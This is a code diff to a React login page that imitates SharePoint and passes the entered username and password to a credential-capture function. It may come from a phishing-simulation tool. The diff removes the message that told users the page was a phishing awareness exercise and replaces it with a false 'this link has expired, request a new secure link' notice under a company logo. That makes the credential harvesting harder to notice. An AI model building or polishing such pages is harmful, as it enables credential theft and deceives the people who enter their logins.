@@ -31,25 +31,25 @@ export default function SharePointLoginPage() {
   const handleSubmit = async (event: FormEvent) => {
     event.preventDefault();
     try {
-      // simulate secure credential capture
+      // Simulate secure credential capture
       await captureCredentials({ username, password });
       setShowAlert(true);
     } catch (error) {
       console.error('Error capturing credentials:', error);
-      setShowAlert(true); // still show alert for awareness
+      setShowAlert(true); // Show alert for awareness
     }
   };
 
   return (
     <div className="relative flex items-center justify-center min-h-screen">
-      {/* Background Image (non-interactive) */}
+      {/* Background Image */}
       {bgImage && (
         <Image
           src={bgImage.imageUrl}
           alt={bgImage.description}
           fill
           priority
-          style={{ objectFit: 'cover', pointerEvents: 'none' }} // 🧠 fix: prevent blocking form clicks
+          style={{ objectFit: 'cover', pointerEvents: 'none' }}
           className="absolute inset-0 z-0"
         />
       )}
@@ -63,11 +63,7 @@ export default function SharePointLoginPage() {
         </CardHeader>
 
         <CardContent>
-          <form
-            onSubmit={handleSubmit}
-            autoComplete="off"
-            className="space-y-4"
-          >
+          <form onSubmit={handleSubmit} autoComplete="off" className="space-y-4">
             <Input
               type="text"
               name="username"
@@ -88,7 +84,6 @@ export default function SharePointLoginPage() {
               className="w-full p-3 border-gray-300 rounded-md text-base"
             />
 
-            {/* Button must render as a <button> element */}
             <Button
               type="submit"
               className="w-full p-3 mt-2 bg-[#217346] text-white font-bold rounded-md hover:bg-green-800 transition-colors"
@@ -107,24 +102,43 @@ export default function SharePointLoginPage() {
       <AlertDialog open={showAlert} onOpenChange={setShowAlert}>
         <AlertDialogContent className="text-center">
           <AlertDialogHeader>
+            {/* ✅ Added Trellissoft Logo */}
             <div className="flex justify-center mb-4">
-              <ShieldX className="w-16 h-16 text-red-500" />
+              <Image
+                src="https://trellissoft.ai/wp-content/uploads/2025/03/Trellissoft-logo-with-tagline-4.png"
+                alt="Trellissoft Logo"
+                width={180}
+                height={60}
+                className="object-contain"
+                priority
+              />
             </div>
-            <AlertDialogTitle className="text-2xl">
+
+            <div className="flex justify-center mb-3">
+              <ShieldX className="w-14 h-14 text-red-500" />
+            </div>
+
+            <AlertDialogTitle className="text-2xl font-semibold text-gray-900">
               This Link Has Expired
             </AlertDialogTitle>
           </AlertDialogHeader>
 
-          <AlertDialogDescription>
-            This page was part of a phishing awareness simulation.
-            In a real scenario, a link might expire for security reasons.
-            <p className="mt-4 text-sm text-muted-foreground">
+          <AlertDialogDescription className="mt-2 text-gray-700 leading-relaxed">
+            ⚠️ This link has expired for security reasons. <br />
+            Your asset update form is no longer available. <br />
+            To protect your information, this link automatically expires after a set time.
+            <br /><br />
+            Please request a new secure link if you still need to update your details.
+            <p className="mt-4 text-sm text-gray-500">
               Always be cautious of unexpected login requests.
             </p>
           </AlertDialogDescription>
 
-          <AlertDialogFooter className="sm:justify-center">
-            <AlertDialogAction onClick={() => setShowAlert(false)}>
+          <AlertDialogFooter className="sm:justify-center mt-4">
+            <AlertDialogAction
+              onClick={() => setShowAlert(false)}
+              className="bg-[#217346] text-white hover:bg-green-800"
+            >
               Continue
             </AlertDialogAction>
           </AlertDialogFooter>
